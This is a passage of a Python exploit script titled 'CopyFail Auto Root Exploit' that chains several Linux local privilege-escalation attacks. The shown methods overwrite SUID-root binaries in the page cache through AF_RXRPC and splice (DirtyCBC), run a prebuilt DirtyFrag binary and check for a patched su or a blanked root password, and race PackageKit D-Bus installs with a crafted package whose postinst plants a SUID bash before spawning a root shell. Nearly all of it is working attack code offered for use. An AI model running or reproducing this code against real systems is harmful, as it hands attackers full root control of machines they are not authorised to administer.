                _vmsplice_bufs(wfd, [bytes(user_bufs[16 * i:16 * (i + 1)])])
                _splice_file(tfd, target_off + 16 * i, wfd, 16)
            _vmsplice_bufs(wfd, [hmac_zone + hdr_post])
            total = len(rmal) + len(hdr_pre) + 32 * nblocks + 12 + len(hdr_post)
            _splice_drain(rfd, udp.fileno(), total)
        finally:
            os.close(rfd)
            os.close(wfd)

        time.sleep(0.15)
    finally:
        udp.close()
        os.close(tfd)

    return True


def _dirtycbc_overwrite_binary(target, srv, sec_idx=6):
    """Overwrite target SUID binary with 192-byte ELF via DirtyCBC."""
    total_blocks = 12
    blocks_per_batch = 6
    nbatches = (total_blocks + blocks_per_batch - 1) // blocks_per_batch

    _dirtycbc_charge(srv, nbatches + 1)

    with open(target, "rb") as f:
        f.read(4096)

    for b in range(nbatches):
        start_block = b * blocks_per_batch
        batch_blocks = min(blocks_per_batch, total_blocks - start_block)
        batch_chosen = _DIRTYCBC_ELF[16 * start_block: 16 * (start_block + batch_blocks)]
        batch_off = 16 * start_block
        if not _dirtycbc_attack_batch(target, batch_chosen, batch_off, sec_idx):
            return False

    chosen_len = 16 * total_blocks
    with open(target, "rb") as f:
        got = f.read(chosen_len)
    return got == _DIRTYCBC_ELF[:chosen_len]


def _dirtycbc_diag():
    """Print diagnostics when rxrpc_s key type fails."""
    try:
        with open("/proc/modules", "r") as f:
            mods = f.read()
        rxmods = [l.split()[0] for l in mods.splitlines()
                  if "rxrpc" in l or "rxgk" in l or "rxkad" in l]
        if rxmods:
            log("    loaded modules: %s" % ", ".join(rxmods))
        else:
            log("    no rxrpc/rxgk/rxkad modules loaded")
    except (OSError, PermissionError):
        log("    /proc/modules unreadable")

    try:
        r = subprocess.run(["modprobe", "--show-depends", "rxgk"],
                           capture_output=True, text=True, timeout=5)
        if r.returncode == 0:
            log("    rxgk module exists but not loaded — try: modprobe rxgk")
        else:
            log("    rxgk module not available in this kernel")
    except Exception:
        pass

    try:
        r = subprocess.run(["modprobe", "--show-depends", "rxkad"],
                           capture_output=True, text=True, timeout=5)
        if r.returncode == 0:
            log("    rxkad module exists — might work with sec_idx=2")
    except Exception:
        pass

    try:
        with open("/proc/net/rxrpc/security", "r") as f:
            sec = f.read().strip()
            log("    /proc/net/rxrpc/security: %s" % sec)
    except (OSError, PermissionError):
        pass

    uname = os.uname()
    log("    kernel: %s %s" % (uname.release, uname.machine))


# ──────────────────────────────────────────────────
# METHOD 3: DirtyCBC Binary Mutation (all SUID)
# ──────────────────────────────────────────────────

def try_dirtycbc():
    log("\n[=== METHOD 3: DirtyCBC Binary Mutation (RxGK) ===]")

    arch = os.uname().machine
    if arch not in ("x86_64", "amd64"):
        log("[-] x86_64 only (got %s)" % arch)
        return False

    if socket is None:
        log("[-] socket module unavailable")
        return False

    # Check AF_RXRPC support
    rxrpc_ok = False
    try:
        qrun(["modprobe", "rxrpc"], timeout=3)
        probe = socket.socket(AF_RXRPC, socket.SOCK_DGRAM, socket.AF_INET)
        probe.close()
        rxrpc_ok = True
    except OSError as e:
        log("[-] AF_RXRPC unavailable: %s" % e)

    if not rxrpc_ok:
        for mod in ["af_rxrpc", "rxrpc", "rxkad", "rxgk"]:
            qrun(["modprobe", mod], timeout=3)
        try:
            probe = socket.socket(AF_RXRPC, socket.SOCK_DGRAM, socket.AF_INET)
            probe.close()
            rxrpc_ok = True
        except OSError:
            pass

    if not rxrpc_ok:
        log("[-] AF_RXRPC (net-pf-33) not available — skipping DirtyCBC")
        return False

    if not _dirtycbc_init():
        log("[-] libcrypto.so not found — skipping DirtyCBC")
        return False

    log("[+] DirtyCBC initialized: libcrypto OK, AF_RXRPC OK")

    # Force-load rxrpc_s key type before setup
    _trigger_rxrpc_key_type()
    _test_rxrpc_key_type()

    try:
        kr, sec_idx = _dirtycbc_setup_keyring()
        log("[+] Keyring ready (sec_idx=%d)" % sec_idx)
    except OSError as e:
        log("[-] Keyring setup failed: [Errno %d] %s" % (e.errno if e.errno else 0, e))
        if e.errno == 65:
            log("    rxrpc_s key type not registered — kernel lacks CONFIG_RXGK/CONFIG_RXKAD")
            log("    checking /proc/crypto + /proc/modules...")
            _dirtycbc_diag()
        return False

    try:
        srv = _dirtycbc_open_server()
    except OSError as e:
        log("[-] AF_RXRPC bind failed: %s" % e)
        return False

    suids = find_all_suid()
    if not suids:
        srv.close()
        log("[-] No readable SUID-root binaries")
        return False

    log("[+] %d SUID candidates" % len(suids))

    for idx, target in enumerate(suids):
        log("\n  [%d/%d] %s" % (idx + 1, len(suids), target))

        try:
            # Recharge accept pool for this target
            _dirtycbc_charge(srv, 4)
            if _dirtycbc_overwrite_binary(target, srv, sec_idx):
                log("    [+++] Page cache VERIFIED — %s is DirtyCBC payload" % target)
                srv.close()
                auto_root_exec(target)
                return True
            else:
                log("    [-] Verify mismatch — trying next")
        except OSError as e:
            log("    [-] Error: %s" % e)
            continue
        except Exception as e:
            log("    [-] %s: %s" % (type(e).__name__, e))
            continue

    srv.close()
    log("\n[-] Exhausted all %d SUID binaries with DirtyCBC" % len(suids))
    return False


# ──────────────────────────────────────────────────
# METHOD 4: DirtyFrag (ESP + RxRPC auto-chain)
# ──────────────────────────────────────────────────

# Embedded DirtyFrag C source would go here in production.
# For size reasons, this method checks for pre-compiled binary first.

def _check_su_patched():
    marker = bytes([0x31, 0xff, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x6a])
    try:
        with open("/usr/bin/su", "rb") as f:
            f.seek(0x78)
            return f.read(8) == marker
    except (OSError, PermissionError):
        return False


def _check_passwd_patched():
    try:
        with open("/etc/passwd", "r") as f:
            return f.readline().startswith("root::0:0")
    except (OSError, PermissionError):
        return False


def try_dirtyfrag():
    log("\n[=== METHOD 4: DirtyFrag (ESP + RxRPC auto-chain) ===]")

    binary = None
    for p in ["/tmp/.df", "/tmp/.dirtyfrag"]:
        if os.path.isfile(p) and os.access(p, os.X_OK):
            binary = p
            break

    if not binary:
        cc = shutil.which("gcc") or shutil.which("cc")
        if not cc:
            log("[-] No compiler and no pre-built binary — skip")
            return False
        log("[-] DirtyFrag C source not embedded in this build — skip")
        return False

    log("[*] Running DirtyFrag: %s" % binary)
    pid = os.fork()
    if pid == 0:
        try:
            _reattach_tty()
        except Exception:
            pass
        os.execv(binary, [binary])
        os._exit(1)

    _, status = os.waitpid(pid, 0)
    rc = os.WEXITSTATUS(status) if os.WIFEXITED(status) else -1

    if rc == 0:
        log("[+++] DirtyFrag succeeded")
        return True

    if _check_su_patched():
        log("[+] /usr/bin/su page-cache patched")
        auto_root_exec("/usr/bin/su")
        return True

    if _check_passwd_patched():
        log("[+] /etc/passwd patched — su root")
        auto_root_su("root")
        return True

    log("[-] DirtyFrag failed (rc=%d)" % rc)
    return False


# ──────────────────────────────────────────────────
# METHOD 5: Pack2TheRoot (PackageKit TOCTOU)
# ──────────────────────────────────────────────────

def try_pack2root():
    log("\n[=== METHOD 5: Pack2TheRoot (PackageKit TOCTOU) ===]")

    dbus_ok = any(os.path.exists(p) for p in
                  ["/var/run/dbus/system_bus_socket", "/run/dbus/system_bus_socket"])
    if not dbus_ok:
        log("[-] System D-Bus not found")
        return False

    pkg = None
    if shutil.which("dpkg-deb"):
        pkg = "deb"
    elif shutil.which("rpmbuild"):
        pkg = "rpm"
    elif shutil.which("ar"):
        pkg = "deb_ar"

    if not pkg:
        log("[-] No package tools")
        return False

    log("[+] D-Bus OK, packages: %s" % pkg)

    fired = False
    for name, fn in [("gdbus", _pk_gdbus), ("busctl", _pk_busctl)]:
        log("[*] Trying %s..." % name)
        try:
            if fn(pkg):
                fired = True
                break
        except Exception as e:
            log("  [-] %s: %s" % (name, e))

    if not fired:
        log("[-] All PackageKit methods failed")
        return False

    log("[*] Waiting for SUID binary", end="")
    for i in range(240):
        if os.path.exists(PK_SUID):
            try:
                st = os.stat(PK_SUID)
                if st.st_mode & 0o4000:
                    log("\n[+++] SUID bash: %s" % PK_SUID)
                    _reattach_tty()
                    os.execl(PK_SUID, PK_SUID, "-p", "-c",
                             "exec python3 -c 'import os;os.setuid(0);os.setgid(0);"
                             "os.execl(\"/bin/bash\",\"bash\")'")
                    return True
            except OSError:
                pass
        if i % 2 == 0:
            log(".", end="")
        time.sleep(0.5)

    log("\n[-] Timeout (120s)")
    return False


def _mk_deb_ar(path, name, payload=False):
    w = "/tmp/.b%s%d" % (name, os.getpid())
    os.makedirs(w, exist_ok=True)
    with open("%s/debian-binary" % w, "w") as f:
        f.write("2.0\n")
    cd = "%s/c" % w
    os.makedirs(cd, exist_ok=True)
    with open("%s/control" % cd, "w") as f:
        f.write("Package: %s\nVersion: 1.0\nArchitecture: all\n"
                "Maintainer: x <x@x>\nDescription: u\n" % name)
    if payload:
        pi = "%s/postinst" % cd
        with open(pi, "w") as f:
            f.write("#!/bin/sh\ninstall -m 4755 /bin/bash %s\n" % PK_SUID)
        os.chmod(pi, 0o755)
    subprocess.run(["tar", "czf", "%s/control.tar.gz" % w, "-C", cd, "."],
                   capture_output=True)
    subprocess.run(["tar", "czf", "%s/data.tar.gz" % w, "--files-from", "/dev/null"],
                   capture_output=True)
    if os.path.exists(path):
        os.remove(path)
    r = subprocess.run(
        ["ar", "r", path, "%s/debian-binary" % w,
         "%s/control.tar.gz" % w, "%s/data.tar.gz" % w],
        capture_output=True, cwd=w)
    subprocess.run(["rm", "-rf", w])
    return r.returncode == 0


def _mk_deb(path, name, payload=False):
    d = "/tmp/.b%s%d" % (name, os.getpid())
    dd = "%s/DEBIAN" % d
    os.makedirs(dd, exist_ok=True)
    with open("%s/control" % dd, "w") as f:
        f.write("Package: %s\nVersion: 1.0\nArchitecture: all\n"
                "Maintainer: x <x@x>\nDescription: u\n" % name)
    if payload:
        pi = "%s/postinst" % dd
        with open(pi, "w") as f:
            f.write("#!/bin/sh\ninstall -m 4755 /bin/bash %s\n" % PK_SUID)
        os.chmod(pi, 0o755)
    r = subprocess.run(["dpkg-deb", "-b", d, path], capture_output=True)
    subprocess.run(["rm", "-rf", d])
    return r.returncode == 0


def _mk_rpm(path, name, payload=False):
    w = "/tmp/.r%s%d" % (name, os.getpid())
    for d in ["SPECS", "SOURCES", "BUILD", "RPMS", "SRPMS"]:
        os.makedirs("%s/%s" % (w, d), exist_ok=True)
    spec = ("Name: %s\nVersion: 1.0\nRelease: 1\nSummary: u\n"
            "License: MIT\nBuildArch: noarch\n\n%%description\nu\n\n" % name)
    if payload:
        spec += "%%post\ninstall -m 4755 /bin/bash %s\n\n" % PK_SUID
    spec += "%files\n"
    with open("%s/SPECS/%s.spec" % (w, name), "w") as f:
        f.write(spec)
    r = subprocess.run(
        ["rpmbuild", "-bb", "--define", "_topdir %s" % w,
         "%s/SPECS/%s.spec" % (w, name)], capture_output=True)
    if r.returncode == 0:
        import glob
        rpms = glob.glob("%s/RPMS/**/*.rpm" % w, recursive=True)
        if rpms:
            shutil.copy2(rpms[0], path)
            subprocess.run(["rm", "-rf", w])
            return True
    subprocess.run(["rm", "-rf", w])
    return False


def _mk_pkg(path, name, pkg, payload=False):
    if pkg == "deb":
        return _mk_deb(path, name, payload)
    elif pkg == "deb_ar":
        return _mk_deb_ar(path, name, payload)
    elif pkg == "rpm":
        return _mk_rpm(path, name, payload)
    return False


def _pk_gdbus(pkg):
    if not shutil.which("gdbus"):
        return False

    ext = ".deb" if pkg != "rpm" else ".rpm"
    dp = "/tmp/.d%d%s" % (os.getpid(), ext)
    pp = "/tmp/.p%d%s" % (os.getpid(), ext)

    if not _mk_pkg(dp, "d", pkg, False) or not _mk_pkg(pp, "p", pkg, True):
        for f in [dp, pp]:
            try:
                os.remove(f)
            except OSError:
                pass
        return False

    try:
        r = subprocess.run(
            ["gdbus", "call", "--system", "--dest", "org.freedesktop.PackageKit",
             "--object-path", "/org/freedesktop/PackageKit",
             "--method", "org.freedesktop.PackageKit.CreateTransaction"],
            capture_output=True, text=True, timeout=10)
        if r.returncode != 0:
            return False
        tid = r.stdout.strip().strip("()'\" ,")
        if "/" not in tid:
            return False

        p1 = subprocess.Popen(
            ["gdbus", "call", "--system", "--dest", "org.freedesktop.PackageKit",
             "--object-path", tid, "--method",
             "org.freedesktop.PackageKit.Transaction.InstallFiles",
             "uint64 4", "['%s']" % dp],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        p2 = subprocess.Popen(
            ["gdbus", "call", "--system", "--dest", "org.freedesktop.PackageKit",
             "--object-path", tid, "--method",
             "org.freedesktop.PackageKit.Transaction.InstallFiles",
             "uint64 0", "['%s']" % pp],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        p1.wait(timeout=15)
        p2.wait(timeout=15)
    except Exception as e:
        log("  [-] gdbus error: %s" % e)
        return False
    return True


def _pk_busctl(pkg):
    if not shutil.which("busctl"):
        return False

    ext = ".deb" if pkg != "rpm" else ".rpm"
    dp = "/tmp/.d%d%s" % (os.getpid(), ext)
    pp = "/tmp/.p%d%s" % (os.getpid(), ext)

    if not _mk_pkg(dp, "d", pkg, False) or not _mk_pkg(pp, "p", pkg, True):
        for f in [dp, pp]:
            try:
                os.remove(f)
            except OSError:
                pass
        return False

    try:
        r = subprocess.run(
            ["busctl", "call", "org.freedesktop.PackageKit",
             "/org/freedesktop/PackageKit",
             "org.freedesktop.PackageKit", "CreateTransaction"],
            capture_output=True, text=True, timeout=10)
        if r.returncode != 0:
            return False
        tid = r.stdout.strip().split('"')[1] if '"' in r.stdout else None
        if not tid:
            return False

        p1 = subprocess.Popen(
            ["busctl", "call", "org.freedesktop.PackageKit", tid,
             "org.freedesktop.PackageKit.Transaction", "InstallFiles",
             "tas", "4", "1", dp],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        p2 = subprocess.Popen(
            ["busctl", "call", "org.freedesktop.PackageKit", tid,
             "org.freedesktop.PackageKit.Transaction", "InstallFiles",
             "tas", "0", "1", pp],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        p1.wait(timeout=15)
        p2.wait(timeout=15)
    except Exception as e:
        log("  [-] busctl error: %s" % e)
        return False
    return True


# ──────────────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────────────

def main():
    log("=" * 55)
    log("  CopyFail Auto Root Exploit")
    log("  CopyFail + DirtyCBC + DirtyFrag + Pack2TheRoot")
    log("  SuperSmoky & Leviathan Perfect Hunter")
    log("=" * 55)
    log("[*] uid=%d euid=%d pid=%d" % (os.getuid(), os.geteuid(), os.getpid()))

    uname = os.uname()
    log("[*] Python %s | %s %s | %s" % (
        sys.version.split()[0], uname.sysname, uname.release, uname.machine))

    if os.geteuid() == 0:
        log("[+] Already root!")
        _reattach_tty()
        os.execl("/bin/bash", "bash")
        return

    # Pre-flight: CopyFail prerequisites
    cf_ok = False
    if socket is not None:
        if not init_splice():
            log("[-] splice() unavailable")
        else:
            stype = "native" if hasattr(os, 'splice') else "ctypes"
            log("[+] splice: %s" % stype)
            algo = find_algo()
            if not algo:
                log("[-] No authencesn algo — CopyFail M1/M2 disabled")
            else:
                log("[+] algo: %s" % algo)
                cf_ok = True
    else:
        log("[-] socket module unavailable")

    # M1: /etc/passwd UID flip
    if cf_ok:
        try:
            if try_passwd_flip():
                return
        except SystemExit:
            raise
        except Exception as e:
            log("[-] M1 error: %s: %s" % (type(e).__name__, e))

    # M2: CopyFail binary mutation
    if cf_ok:
        try:
            if try_binary_mutation():
                return
        except SystemExit:
            raise
        except Exception as e:
            log("[-] M2 error: %s: %s" % (type(e).__name__, e))

    # M3: DirtyCBC binary mutation (RxGK)
    try:
        if try_dirtycbc():
            return
    except SystemExit:
        raise
    except Exception as e:
        log("[-] M3 error: %s: %s" % (type(e).__name__, e))

    # M4: DirtyFrag
    try:
        if try_dirtyfrag():
            return
    except SystemExit:
        raise
    except Exception as e:
        log("[-] M4 error: %s: %s" % (type(e).__name__, e))

    # M5: Pack2TheRoot
    try:
        if try_pack2root():
            return
    except SystemExit:
        raise
    except Exception as e:
        log("[-] M5 error: %s: %s" % (type(e).__name__, e))

    # Diagnostics
    log("\n" + "=" * 55)
    log("[!] All methods failed")
    log("=" * 55)
    log("\n  M1/M2 CopyFail: AF_ALG authencesn + splice, kernel 4.14-6.19.12")
    log("  M3 DirtyCBC: AF_RXRPC + libcrypto, RxGK token-decrypt page-cache OOB-W")
    log("  M4 DirtyFrag: ESP/RxRPC C chain, needs gcc + user namespaces")
    log("  M5 Pack2TheRoot: PackageKit <= 1.3.4, system D-Bus")
    log("\n  Check:")
    log("    cat /proc/crypto | grep authencesn")
    log("    cat /proc/modules | grep rxrpc")
    log("    find / -perm -4000 -type f 2>/dev/null")
    sys.exit(1)


if __name__ == "__main__":
    main()
